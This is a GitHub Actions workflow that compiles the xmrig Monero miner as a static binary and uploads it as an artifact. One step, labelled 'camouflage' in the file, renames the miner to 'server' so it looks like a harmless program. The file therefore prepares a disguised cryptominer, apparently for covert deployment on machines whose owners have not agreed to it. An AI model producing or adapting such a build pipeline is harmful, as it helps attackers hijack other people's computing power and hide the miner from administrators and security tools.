name: Build Server

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          submodules: true

      - name: Install dependencies
        run: sudo apt-get update && sudo apt-get install -y build-essential cmake git libuv1-dev libssl-dev libhwloc-dev

      - name: Build static xmrig
        run: |
          mkdir build
          cd build
          cmake .. -DBUILD_STATIC=ON -DWITH_HWLOC=ON
          make -j$(nproc)

      - name: Rename to server (camouflage)
        run: mv build/xmrig build/server

      - name: Upload final file
        uses: actions/upload-artifact@v4
        with:
          name: server
          path: build/server
